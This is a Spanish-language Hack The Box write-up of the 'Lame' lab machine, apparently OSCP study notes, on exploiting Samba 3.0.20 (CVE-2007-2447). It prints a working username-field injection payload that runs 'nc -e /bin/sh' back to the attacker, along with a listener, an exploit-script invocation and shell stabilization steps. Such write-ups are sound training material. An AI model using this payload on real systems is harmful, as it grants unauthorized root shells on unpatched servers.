[🟢 Lame — HTB [Linux · Easy] 32315bd2d16c800c9d6bc8362a6f212c.md](https://github.com/user-attachments/files/28280738/Lame.HTB.Linux.Easy.32315bd2d16c800c9d6bc8362a6f212c.md)
# 🟢 Lame — HTB [Linux · Easy]

> **Plataforma:** Hack The Box | **OS:** Linux | **Dificultad:** Easy | **CVE principal:** CVE-2007-2447
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.10.10.3` |
| Vector | Samba 3.0.20 — Username map script RCE |
| Acceso inicial | Shell directa como **root** |
| PrivEsc | No necesaria (ya somos root desde el foothold) |
| Flags | `user.txt`  • `root.txt` |

---

# 1. Reconocimiento

## Nmap — Escaneo inicial

```bash
nmap -sV -sC -p- --min-rate 5000 -oN lame.nmap 10.10.10.3
```

### Resultados relevantes

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-03-11T10:17:12-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Análisis de la superficie de ataque

Los puertos más interesantes a primera vista:

- **Puerto 21 — FTP vsftpd 2.3.4:** Permite login anónimo. La versión 2.3.4 tiene una backdoor conocida (CVE-2011-2523), pero en este caso está parcheada y el FTP anonymous no tiene archivos útiles.
- **Puerto 22 — SSH:** Sin credenciales, no hay vector aquí.
- **Puerto 445 — Samba 3.0.20:** ⚠️ Esta versión es vulnerable a CVE-2007-2447, ejecución remota de comandos sin autenticación.
- **Puerto 3632 — distccd:** También vulnerable (CVE-2004-2687), pero da shell como `daemon`, no como root.

---

# 2. Enumeración

## FTP — Login anónimo

```bash
ftp 10.10.10.3
# Usuario: anonymous | Contraseña: (enter)
ls -la
# Directorio vacío, sin nada útil
```

> El FTP de vsftpd 2.3.4 tiene una backdoor (abre puerto 6200 al enviar `:)` en el usuario), pero en Lame está parcheada. Lo confirmamos intentando conectar al 6200 — no responde.
> 

## SMB — Enumeración de shares

```bash
smbclient -L //10.10.10.3 -N
```

```
Sharename   Type   Comment
---------   ----   -------
print$      Disk   Printer Drivers
tmp         Disk   oh noes!
opt         Disk
IPC$        IPC    IPC Service (lame server)
ADMIN$      IPC    IPC Service (lame server)
```

El share `tmp` es accesible sin credenciales. Sin embargo, el vector real no está en los archivos del share sino en la vulnerabilidad del servicio Samba en sí.

---

# 3. Explotación — CVE-2007-2447 (Samba Username Map Script)

## ¿Qué es esta vulnerabilidad?

**CVE-2007-2447** afecta a **Samba 3.0.0 – 3.0.25rc3**.

El problema está en la opción `username map script` del archivo de configuración `smb.conf`. Cuando esta opción está activa, Samba pasa el nombre de usuario recibido directamente a `/bin/sh` sin sanitizarlo. Esto permite inyectar comandos shell arbitrarios dentro del campo username al autenticarse — sin necesitar credenciales válidas.

El flujo es:

```
Cliente envía username → Samba lo pasa a /bin/sh → RCE como root
```

Por qué es tan grave: Samba en ese momento corría como **root** en la mayoría de sistemas Linux, así que la ejecución de comandos se da directamente con los máximos privilegios.

## Explotación manual (sin Metasploit)

Primero ponemos un listener:

```bash
nc -lvnp 4444
```

Luego usamos `smbclient` para conectarnos al share `tmp` e inyectar el payload en el campo de username:

```bash
smbclient //10.10.10.3/tmp -N \
  --option='client min protocol=NT1' \
  -U "./=`nohup nc -e /bin/sh 10.10.14.27 4444`"
```

O usando el exploit en Python que crea un entorno virtual limpio:

```bash
# Crear entorno virtual
python3 -m venv venv
source venv/bin/activate
pip install pysmb

# Ejecutar el exploit
python3 usermap_script.py 10.10.10.3 445 10.10.14.27 4444
```

El script envía el payload al servicio Samba a través del campo de username durante la negociación de sesión SMB.

## ¿Por qué funciona sin credenciales?

La inyección ocurre **antes** de que Samba valide cualquier credencial. El servicio procesa el username para aplicar el script de mapeo, y en ese momento ejecuta el comando inyectado. No importa si la contraseña es incorrecta — el RCE ya se ha disparado.

---

# 4. Post-Explotación

## Shell recibida

```bash
# En el listener recibimos:
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.3] 40123
id
uid=0(root) gid=0(root)
```

Acceso directo como **root**. No hay escalada de privilegios necesaria.

## Estabilización de la shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

## Flags

```bash
# User flag
find / -name user.txt 2>/dev/null
cat /home/makis/user.txt

# Root flag
cat /root/root.txt
```

---

# 5. Historial de Errores — Lo Que Falló y Por Qué

Esta sección documenta los obstáculos reales. Es la parte más valiosa para el OSCP.

## Error 1 — vsftpd 2.3.4 backdoor no funcionó

**Síntoma:** Se intentó explotar la backdoor de vsftpd 2.3.4 (CVE-2011-2523) enviando `:)` en el usuario para abrir el puerto 6200, pero no respondió.

**Causa:** La versión de vsftpd en Lame está parcheada. El hecho de que un servicio tenga una versión con CVE conocido no garantiza que sea explotable — puede estar parcheado o la configuración puede diferir.

**Lección:** Siempre confirmar el vector antes de invertir tiempo. Un `nc 10.10.10.3 6200` tras el intento de backdoor lo confirma en segundos. No asumir que la versión = explotable.

---

## Error 2 — distccd tentador pero subóptimo

**Síntoma:** El puerto 3632 (distccd) era vulnerable a CVE-2004-2687 y podría haber dado acceso.

**Causa:** distccd da shell como `daemon`, no como root. Habría requerido una escalada de privilegios adicional.

**Lección:** Cuando tienes múltiples vectores disponibles, priorizar siempre el que da mayor privilegio directamente. Samba 3.0.20 daba root directo — es el vector correcto. Evaluar el nivel de acceso que da cada vector antes de elegir.

---

## Error 3 — Dependencias del exploit Python (entorno virtual)

**Síntoma:** Al intentar ejecutar `usermap_script.py` sin entorno virtual, conflictos con versiones de `pysmb` o `impacket` del sistema.

**Causa:** Los exploits de repositorios externos suelen requerir versiones específicas de librerías que pueden chocar con las instaladas en el sistema.

**Solución:** Siempre usar entorno virtual para exploits con dependencias:

```bash
python3 -m venv venv
source venv/bin/activate
pip install pysmb
python3 usermap_script.py 10.10.10.3 445 TU_IP 4444
```

---

# 6. Moralejas y Notas para el OSCP

## Moraleja 1 — La versión exacta del servicio lo es todo

Lame enseña el principio más fundamental del OSCP: **la versión exacta de un servicio determina si es explotable o no**. `Samba 3.0.20` es vulnerable. `Samba 3.0.26` no lo es. Un número diferente cambia completamente el vector.

El flujo mental correcto ante cualquier servicio:

```
Versión detectada → buscar CVE exacto → confirmar que aplica → explotar
```

Nunca saltarse el paso de confirmar. Una versión parcheada o ligeramente diferente puede hacer que el exploit no funcione y se pierda tiempo valioso en el OSCP.

---

## Moraleja 2 — FTP anónimo no siempre es un vector

Lame tiene FTP anónimo habilitado con vsftpd 2.3.4 — una combinación que en otra máquina sería explosiva. Aquí no lleva a ningún lado: directorio vacío y backdoor parcheada.

Para el OSCP: el FTP anónimo es siempre un punto a explorar, pero no asumir que es el vector principal. Enumerar, confirmar que hay algo útil, y si no hay nada moverse al siguiente servicio sin perder tiempo.

---

## Moraleja 3 — Elegir el vector de mayor privilegio cuando hay varios

Lame tenía dos vectores válidos: Samba (root directo) y distccd (daemon + escalada). La decisión correcta es ir siempre al que da mayor acceso con menos pasos. En el OSCP el tiempo es crítico — un vector que da SYSTEM/root directo siempre vale más que uno que requiere pasos adicionales de escalada.

---

## Moraleja 4 — RCE pre-auth es el escenario más valioso

CVE-2007-2447 ejecuta el payload **antes de validar credenciales**. Esto es el escenario más limpio posible — no necesitas credenciales, no necesitas enumerar usuarios, no necesitas nada más que la versión del servicio y un listener.

Cuando en el OSCP encuentres un servicio con RCE pre-auth, es el vector prioritario absoluto. No hay nada más eficiente.

---

## Moraleja 5 — El patrón de Lame como base de todo

```
nmap -sV → versión exacta del servicio
    ↓
buscar CVE por versión (searchsploit / exploit-db)
    ↓
confirmar que aplica (no solo asumir)
    ↓
explotar → root/SYSTEM directo
```

Este es el patrón más básico del OSCP y Lame lo ilustra en su forma más pura. Todas las máquinas más complejas son variaciones de este mismo flujo con más capas encima.

---

# 7. Lecciones aprendidas

| Concepto | Detalle |
| --- | --- |
| **Versiones antiguas = vulnerabilidades críticas** | Samba 3.0.20 es de 2007. Siempre buscar CVEs por versión exacta |
| **Samba corriendo como root** | Error de configuración clásico en sistemas legacy |
| **RCE sin autenticación** | La inyección ocurre antes de validar credenciales |
| **Anonymous FTP ≠ vector** | Aunque estaba disponible, no había nada útil — no asumir siempre |
| **Enumerar todos los servicios** | El puerto 3632 (distccd) también era vulnerable, pero daba shell como daemon, no root |

---

# 6. Comandos clave (resumen rápido)

```bash
# Reconocimiento
nmap -sV -sC -p- --min-rate 5000 10.10.10.3

# Enumerar SMB
smbclient -L //10.10.10.3 -N

# Listener
nc -lvnp 4444

# Exploit Samba CVE-2007-2447
python3 usermap_script.py 10.10.10.3 445 <TU_IP> 4444

# Estabilizar shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

## ¿Qué es CVE-2007-2447 y por qué funciona?

**Samba** es el software que implementa el protocolo SMB en Linux, permitiendo compartir archivos con Windows. La versión **3.0.20** tiene un fallo de diseño muy concreto: cuando la opción `username map script` está activa en la configuración, Samba coge el nombre de usuario que recibe del cliente y lo pasa directamente a `/bin/sh` sin ningún tipo de sanitización.

Esto significa que si envías como username algo como:

`./=\`nc -e /bin/sh 10.10.14.27 4444``

Samba literalmente ejecuta eso en la shell del sistema. Y lo hace **antes de validar ninguna credencial**, así que no necesitas usuario ni contraseña válidos.

Lo que lo hace especialmente grave en Lame es que en esa época era habitual que Samba corriese como **root**, así que obtienes shell directamente con máximos privilegios sin ningún paso adicional.

**Por qué es importante para el OSCP:** Lame te enseña el flujo básico — enumeración de versiones → búsqueda de CVE → explotación directa. Es la máquina más simple del path pero establece el patrón mental que usarás en todas las demás. Lo más importante que hay que interiorizar es que **la versión exacta de un servicio lo es todo** — un número de versión diferente puede ser la diferencia entre RCE como root y nada.
